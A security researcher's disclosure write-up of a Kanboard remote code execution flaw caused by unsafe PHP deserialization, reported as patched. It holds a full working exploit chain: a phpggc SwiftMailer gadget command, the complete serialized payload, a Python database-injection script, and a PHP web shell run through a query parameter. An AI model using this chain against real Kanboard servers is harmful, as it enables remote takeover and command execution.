---
layout: post
title: "Kanboard CVE-2025-55010"
category: cve
tags: [kanboard, cve-2025-55010, security]
cvss_score: 9.1
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
---

<style>
pre {
  margin-top: 1.5em;   /* space above */
  margin-bottom: 1.5em !important; /* space below */
}
</style>

## Authenticated Admin Remote Code Execution via Unsafe Deserialization

{% if page.cvss_score %}
  {% include cvss.html score=page.cvss_score vector=page.cvss_vector %}
{% endif %}

[Kanboard](https://github.com/kanboard/kanboard/), like many other apps, uses `admin:admin` as its default admin login credentials. While this is convenient for installing and testing the app, it also leaves open the possibly that a lazy sysadmin could forget to change the password. Given that the codebase has almost 10k stars, it's not unthinkable that there could be hundreds of instances of Kanboard in the wild using default creds.

With this in mind, I decided to do a little experiment.  If a hacker were to login as admin with these creds, how far could they get?  Would it be easy to plant a shell on the system, or are there checks in place to prevent such things from happening?

As it turns out, Kanboard is fairly robust at preventing direct code execution.  My first thought was that since the app allows plugin installation, an attacker could just write a malicious plugin, install it, and execute arbitrary php. However, I discovered that plugins are disabled by default, and can only be enabled from the command line, which an attacker would not have access to.

<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/kanboard/kb_plugins_disabled.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>

For my next vector, I considered database upload. Kanboard by default stores all of its data in SQLite, and admins have the ability to both upload and download the database. 

<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/kanboard/kb_db_upload.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>

But even here, there were limited options. All of the critical functionality of Kanboard seems to come from the ENV args in the Docker container, none of which are stored in the DB. 

With the "low-hanging fruit" out of the way, I decided to dive deeper into the codebase, turning my attention to dangerous method calls.


### Identifying the Vulnerability

After running a search for dangerous method calls, there was a line in the `ProjectActivityEventFormatter` that caught my eye. 

```php
/**
 * Decode event data, supports unserialize() and json_decode()
 *
 * @access protected
 * @param  string   $data   Serialized data
 * @return array
 */
protected function unserializeEvent($data)
{
    if ($data[0] === 'a') {
        return unserialize($data);
    }

    return json_decode($data, true) ?: array();
}
```

If the `event->data` field starts with the letter `a`, the app will blindly deserialize the object and return it. By default, this field is likely an array or associative array that has been serialized into a PHP object, and the creator of the method probably never assumed that it could be used for malicious purposes.

I then traced the `unserializeEvent` function and found that it was being called within the `format` method.

```php
public function format()
{
    $events = $this->query->findAll();
    $res = array();

    foreach ($events as &$event) {
        $event += $this->unserializeEvent($event['data']);
        unset($event['data']);
```

So there we have it.  The events are being read from the DB and their `data` field is being passed into `unserializeEvent`. This is where the part about admins being able to upload / download the DB is so important. A malicious admin could update the `data` column of an event to any arbitrary serialized object (as long as it starts with an a:) and the app will blindly deserialize it.


### Exploiting
#### Finding a Proper Gadget
PHP is a little different than languages like JAVA, where you could serialize a method call and ensure remote code execution.  Just getting an object unserialized is not enough to get RCE.  An attacker needs to upload a gadget that will somehow be triggered through a method call within the app itself.  With that in mind, I decided to look at potential paths for execution.

Kanboard is a small, self-contained app, and therefore does not contain many libraries suitable for gadget use. However, I did find that it included `SwiftMailer`, which I've seen abused in other gadget exploits, so I decided to follow that path.

Rather than writing my own gadget chain from scratch, I entailed the help of the PHP general gadget chain tool `phpggc` to look for possiblities.

```
└─$ phpggc -l | grep -i swift

SwiftMailer/FD1   -5.4.12+, -6.2.1+    File delete        __destruct
SwiftMailer/FD2   5.4.6 <= 5.x-dev     File delete        __destruct     *
SwiftMailer/FR1   6.0.0 <= 6.3.0       File read          __toString
SwiftMailer/FW1   5.1.0 <= 5.4.8       File write         __toString
SwiftMailer/FW2   6.0.0 <= 6.0.1       File write         __toString
SwiftMailer/FW3   5.0.1                File write         __toString
SwiftMailer/FW4   4.0.0 <= ?           File write         __destruct
```

While I couldn't find the exact version of SwiftMailer the app was using, I gauged it to be around `5.4.5`, which matched up with the `SwiftMailer/FW1` gadget.

```
SwiftMailer/FW1     5.1.0 <= 5.4.8     File write     __toString
```

For those not familiar, this gadget will give me arbitrary file write on the system, but only when triggered by a `toString` call. I then set off to find instances in the app where `event->data` might be passed into a method that calls `toString`.

After scouring across event-related views and templates, I came across the following in `comment_create.php`

```html
<p class="activity-title">
    <?= e('%s commented the task %s',
            $this->text->e($author),
            $this->url->link(t('#%d', $task['id']), 'TaskViewController', 'show', array('task_id' => $task['id']))
        ) ?>
    <small class="activity-date"><?= $this->dt->datetime($date_creation) ?></small>
</p>
<div class="activity-description">
    <p class="activity-task-title"><?= $this->text->e($task['title']) ?></p>
    <div class="markdown"><?= $this->text->markdown($comment['comment']) ?></div>
</div>
```

Notice the second to last line
```html
<div class="markdown"><?= $this->text->markdown($comment['comment']) ?></div>
```

The `comment['comment']` field is being passed into a markdown parser, which is likely expecting a string parameter, meaning that `toString` will be called on the object passed as a parameter!  This is just the invocation we need to trigger our gadget.

The basic gameplan now becomes clear.

1. Create a new `event` in the DB and change its name to `comment-create`.
2. Inside the `data` field, serialize a `Comment` object like the following:
```php
{
    "id": 1,
    "timestamp": 12341234132,
    "comment": {
        "id": 1
        "title": "test"
        "comment": <gadget>,
        ...
    }
}
```
3. Upload the DB.
4. Visit the project activities page to trigger our gadget via Markdown.


#### Planting the Seed
With the basic plan of attack underway, we now need to figure out where to place our arbitrary file write so that we have execution access to whatever we upload. In the docker configuration, Kanboard runs as the `nginx` user.  Inside the app directory, there are only two folders writable to the `nginx` user, `/data` and `/plugins`.  

```
088f12e8a701:/var/www/app# ls -al
total 92
drwxr-xr-x    1 root     root          4096 Jun 22 21:26 .
drwxr-xr-x    1 root     root          4096 Jun 22 21:26 ..
drwxr-xr-x    2 root     root          4096 Jun 22 21:26 .devcontainer
-rw-r--r--    1 root     root          1080 Jun 22 21:26 LICENSE
drwxr-xr-x    1 root     root          4096 Jun 22 21:26 app
drwxr-xr-x    6 root     root          4096 Jun 22 21:26 assets
-rwxr-xr-x    1 root     root           582 Jun 22 21:26 cli
-rw-r--r--    1 root     root         10173 Jun 22 21:26 config.default.php
-rw-r--r--    1 root     root           133 Jun 22 21:26 config.php
drwxr-xr-x    2 nginx    nginx         4096 Aug 13 07:13 data
-rw-r--r--    1 root     root         13094 Jun 22 21:26 favicon.ico
-rw-r--r--    1 root     root           587 Jun 22 21:26 healthcheck.php
-rw-r--r--    1 root     root           309 Jun 22 21:26 index.php
-rw-r--r--    1 root     root            78 Jun 22 21:26 jsonrpc.php
drwxr-xr-x   14 root     root          4096 Jun 22 21:26 libs
drwxr-xr-x    2 nginx    nginx         4096 Jun 22 21:26 plugins
-rw-r--r--    1 root     root            25 Jun 22 21:26 robots.txt
drwxr-xr-x    7 root     root          4096 Jun 22 21:26 vendor
```

Looking at the `nginx.conf`, 

```
location ~ \.php$ {
    try_files $uri =404;
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass unix:/var/run/php-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_index index.php;
    include fastcgi_params;
    fastcgi_param SERVER_NAME $host;
    fastcgi_param HTTP_X_REAL_IP $remote_addr;
    fastcgi_param HTTP_X_FORWARDED_FOR $proxy_add_x_forwarded_for;
}

location ~ /data {
    return 404;
}
```

we can see that the `/data` directory forbids any execution (likely to stop user file uploads from executing). But lucky for us, we still have the `/plugins` directory which allows for full php script execution!

Given this info, I decided the point of attack would be to write a simple php reverse shell file into `/var/www/app/plugins/test.php`.

```php
<?php system($_GET['x']); ?>
```

To accomplish this, an attacker can generate a gadget using the `phpggc` method from earlier

```
phpggc SwiftMailer/FW1 /var/www/app/plugins/test.php /home/kali/bounty/kanboard/payload.php > payload.txt
```

Now all that's left is to create a serialized associative array object and paste the output from `phpggc` into the `comment` field. This ended up being the final object that I used:

```
a:6:{s:7:"comment";a:2:{s:7:"comment";O:13:"Swift_Message":8:{s:37:"Swift_Mime_SimpleMimeEntity_headers";O:26:"Swift_Mime_SimpleHeaderSet":1:{s:36:"Swift_Mime_SimpleHeaderSet_factory";O:30:"Swift_Mime_SimpleHeaderFactory":3:{s:40:"Swift_Mime_SimpleHeaderFactory_encoder";O:44:"Swift_Mime_HeaderEncoder_Base64HeaderEncoder":0:{}s:45:"Swift_Mime_SimpleHeaderFactory_paramEncoder";O:44:"Swift_Mime_HeaderEncoder_Base64HeaderEncoder":0:{}s:40:"Swift_Mime_SimpleHeaderFactory_grammar";O:18:"Swift_Mime_Grammar":0:{}}}s:34:"Swift_Mime_SimpleMimeEntity_body";s:28:"<?php system($_GET['x']); ?>";s:37:"Swift_Mime_SimpleMimeEntity_encoder";O:43:"Swift_Mime_ContentEncoder_RawContentEncoder":0:{}s:35:"Swift_Mime_SimpleMimeEntity_cache";O:28:"Swift_KeyCache_ArrayKeyCache":2:{s:39:"Swift_KeyCache_ArrayKeyCache_contents";a:0:{}s:37:"Swift_KeyCache_ArrayKeyCache_stream";O:40:"Swift_KeyCache_SimpleKeyCacheInputStream":4:{s:51:"Swift_KeyCache_SimpleKeyCacheInputStream_keyCache";O:28:"Swift_KeyCache_ArrayKeyCache":2:{s:39:"Swift_KeyCache_ArrayKeyCache_contents";a:0:{}s:37:"Swift_KeyCache_ArrayKeyCache_stream";N;}s:48:"Swift_KeyCache_SimpleKeyCacheInputStream_nsKey";s:9:"something";s:50:"Swift_KeyCache_SimpleKeyCacheInputStream_itemKey";s:9:"something";s:55:"Swift_KeyCache_SimpleKeyCacheInputStream_writeThrough";O:31:"Swift_ByteStream_FileByteStream":2:{s:38:"Swift_ByteStream_FileByteStream_path";s:29:"/var/www/app/plugins/test.php";s:38:"Swift_ByteStream_FileByteStream_mode";s:3:"w+b";}}}s:38:"Swift_Mime_SimpleMimeEntity_cacheKey";s:9:"something";s:28:"Swift_MessageheaderSigners";a:1:{i:0;O:29:"Swift_Signers_DomainKeySigner":2:{s:14:"*_privateKey";s:886:"-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQDRpx277bhMnUSga718Dd7P7ZA+23B8kBzqie3hFklaPFL8R18w
bVjHU4VHJq1SIrkbaX9MKnuAl4y9VSruQuJtjb9k1mk1CaWgESwK0ViOx9ugoI4B
cmEToyO/gCPKAkF69r7Lfy/M0VOxXH58QURCQU3dS3pm5SP8hhy/ag8fowIDAQAB
AoGATbKBcoRHKR2fsVQ8hR0e1jBUpPbuWTuPe9xiLGj2BlsU5ioNPQVJQZXSbuwG
j8oOj/opEzErVBzWK9TEdEiVYRhcyPc6awiIulZAp928TRsP0+ZjKOTXtgU40GNf
BqdaI8oMgSjeB3mbJP9S9ghVmOEN1AArOPBrWKyIEcDq/gECQQD5C0rb1lYqN7Om
yx6gYUXW91xs40PCtNI1EVtFVkVb4B3Dsz3tmi93NxgDK+fJLcid3Yx4PF0v1pm6
ysBU2vupAkEA14IrToWxTtzcPI9852TJ4A9IA93Y7AppmWzkxp0uPM0tmRIuOpK+
foLPtdLcXE7KAtHoHnccpGSQE33clb5wawJBAOYPHXcZd/2F+UqCZudnFHoxhcr8
4nKyUWE+iF70BByMW1KWeQXOIjzxwxfi7jq1NZdHu2Sy9q6jgt3AQI3iwQkCQCy0
gP1R+H0OjdU2QsfRfZswMFU1ARm98zfzgeW9l2jfezUEs3hNFp0xz5q9Oh8f7QH2
vzsKpHNptQWGF2sszS8CQQCMZbkmUguZhj72vvJ33bbugLtjv2AjTQxwAOAZZF+3
6P1HpTADFnZQZbGAmjJNT//JEHs6+TTbb1Wjj+mJHbmR
-----END RSA PRIVATE KEY-----";s:37:"Swift_Signers_DomainKeySigner_bound";a:1:{i:0;r:13;}}}s:26:"Swift_MessagebodySigners";a:0:{}s:27:"Swift_MessagesavedMessage";a:0:{}}s:10:"visibility";i:1;}s:11:"author_name";s:4:"evil";s:15:"author_username";s:0:"";s:10:"event_name";s:14:"comment.create";s:4:"task";a:2:{s:2:"id";i:1;s:5:"title";s:4:"test";}s:13:"date_creation";i:1725000000;}                                                                                

```

#### PoC
1. Login as default admin user admin:admin
2. Create a project and a task.
3. Download and unzip the database.
4. Find a target row (any row will work) in the `project_activities` table and update the `event_name` field to `comment.create`.
    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/kanboard/db_edit.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>
5. Use the following Python script to update the `data` column on the target row.

    ```python
    import sqlite3

    payload = b'a:6:{s:7:"comment";a:2:{s:7:"comment";O:13:"Swift_Message":8:{s:37:"\x00Swift_Mime_SimpleMimeEntity\x00_headers";O:26:"Swift_Mime_SimpleHeaderSet":1:{s:36:"\x00Swift_Mime_SimpleHeaderSet\x00_factory";O:30:"Swift_Mime_SimpleHeaderFactory":3:{s:40:"\x00Swift_Mime_SimpleHeaderFactory\x00_encoder";O:44:"Swift_Mime_HeaderEncoder_Base64HeaderEncoder":0:{}s:45:"\x00Swift_Mime_SimpleHeaderFactory\x00_paramEncoder";O:44:"Swift_Mime_HeaderEncoder_Base64HeaderEncoder":0:{}s:40:"\x00Swift_Mime_SimpleHeaderFactory\x00_grammar";O:18:"Swift_Mime_Grammar":0:{}}}s:34:"\x00Swift_Mime_SimpleMimeEntity\x00_body";s:28:"<?php system($_GET[\'x\']); ?>";s:37:"\x00Swift_Mime_SimpleMimeEntity\x00_encoder";O:43:"Swift_Mime_ContentEncoder_RawContentEncoder":0:{}s:35:"\x00Swift_Mime_SimpleMimeEntity\x00_cache";O:28:"Swift_KeyCache_ArrayKeyCache":2:{s:39:"\x00Swift_KeyCache_ArrayKeyCache\x00_contents";a:0:{}s:37:"\x00Swift_KeyCache_ArrayKeyCache\x00_stream";O:40:"Swift_KeyCache_SimpleKeyCacheInputStream":4:{s:51:"\x00Swift_KeyCache_SimpleKeyCacheInputStream\x00_keyCache";O:28:"Swift_KeyCache_ArrayKeyCache":2:{s:39:"\x00Swift_KeyCache_ArrayKeyCache\x00_contents";a:0:{}s:37:"\x00Swift_KeyCache_ArrayKeyCache\x00_stream";N;}s:48:"\x00Swift_KeyCache_SimpleKeyCacheInputStream\x00_nsKey";s:9:"something";s:50:"\x00Swift_KeyCache_SimpleKeyCacheInputStream\x00_itemKey";s:9:"something";s:55:"\x00Swift_KeyCache_SimpleKeyCacheInputStream\x00_writeThrough";O:31:"Swift_ByteStream_FileByteStream":2:{s:38:"\x00Swift_ByteStream_FileByteStream\x00_path";s:29:"/var/www/app/plugins/test.php";s:38:"\x00Swift_ByteStream_FileByteStream\x00_mode";s:3:"w+b";}}}s:38:"\x00Swift_Mime_SimpleMimeEntity\x00_cacheKey";s:9:"something";s:28:"\x00Swift_Message\x00headerSigners";a:1:{i:0;O:29:"Swift_Signers_DomainKeySigner":2:{s:14:"\x00*\x00_privateKey";s:886:"-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQDRpx277bhMnUSga718Dd7P7ZA+23B8kBzqie3hFklaPFL8R18w\nbVjHU4VHJq1SIrkbaX9MKnuAl4y9VSruQuJtjb9k1mk1CaWgESwK0ViOx9ugoI4B\ncmEToyO/gCPKAkF69r7Lfy/M0VOxXH58QURCQU3dS3pm5SP8hhy/ag8fowIDAQAB\nAoGATbKBcoRHKR2fsVQ8hR0e1jBUpPbuWTuPe9xiLGj2BlsU5ioNPQVJQZXSbuwG\nj8oOj/opEzErVBzWK9TEdEiVYRhcyPc6awiIulZAp928TRsP0+ZjKOTXtgU40GNf\nBqdaI8oMgSjeB3mbJP9S9ghVmOEN1AArOPBrWKyIEcDq/gECQQD5C0rb1lYqN7Om\nyx6gYUXW91xs40PCtNI1EVtFVkVb4B3Dsz3tmi93NxgDK+fJLcid3Yx4PF0v1pm6\nysBU2vupAkEA14IrToWxTtzcPI9852TJ4A9IA93Y7AppmWzkxp0uPM0tmRIuOpK+\nfoLPtdLcXE7KAtHoHnccpGSQE33clb5wawJBAOYPHXcZd/2F+UqCZudnFHoxhcr8\n4nKyUWE+iF70BByMW1KWeQXOIjzxwxfi7jq1NZdHu2Sy9q6jgt3AQI3iwQkCQCy0\ngP1R+H0OjdU2QsfRfZswMFU1ARm98zfzgeW9l2jfezUEs3hNFp0xz5q9Oh8f7QH2\nvzsKpHNptQWGF2sszS8CQQCMZbkmUguZhj72vvJ33bbugLtjv2AjTQxwAOAZZF+3\n6P1HpTADFnZQZbGAmjJNT//JEHs6+TTbb1Wjj+mJHbmR\n-----END RSA PRIVATE KEY-----";s:37:"\x00Swift_Signers_DomainKeySigner\x00_bound";a:1:{i:0;r:13;}}}s:26:"\x00Swift_Message\x00bodySigners";a:0:{}s:27:"\x00Swift_Message\x00savedMessage";a:0:{}}s:10:"visibility";i:1;}s:11:"author_name";s:4:"evil";s:15:"author_username";s:0:"";s:10:"event_name";s:14:"comment.create";s:4:"task";a:2:{s:2:"id";i:1;s:5:"title";s:4:"test";}s:13:"date_creation";i:1725000000;}'


    conn = sqlite3.connect("db.sqlite")
    cursor = conn.cursor()

    cursor.execute("""
        UPDATE project_activities
        SET data = ?
        WHERE rowid = ?
    """, (payload.decode('utf-8'), 1)) # CHANGE ROW ID HERE IF NOT TARGETING FIRST ROW

    conn.commit()

    cursor.execute("SELECT data FROM project_activities WHERE id = 1")
    row = cursor.fetchone()
    print(repr(row[0]))
    ```
6. Re-zip the db.sqlite file and upload it.
7. Visit the task activity stream (in my case http://localhost:3000/task/1/activity). You should see the following error.

    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/kanboard/kanboard_tostring_success.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>

    This means that toString was called on the gadget and that file write should have succeeded.
8. The reverse shell should be written into the plugins directory. Visit `/plugins/test.php?x=<cmd>` to run arbitrary system commands via the webshell.

Here's an example of me running the id command via `http://localhost:3000/plugins/test.php?x=id`

<figure style="text-align: center; margin: 2em 0;">
  <img src="/assets/img/kanboard/kanboard_rev_shell.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
</figure>

Success! We can now run any command we want on the host machine.
<br/>
<br/>
<br/>

### Final Thoughts
Even something as unassuming as a simple formatter can be dangerous, especially when paired with methods like `unserialize`. Turns out that the deserialization was a legacy feature that's not really used anymore. Just shows how tech debt can often become a backdoor for attackers.

Note that this has been patched and a security advisory has been published here: [GHSA-359x-c69j-q64r advisory](https://github.com/kanboard/kanboard/security/advisories/GHSA-359x-c69j-q64r)
 
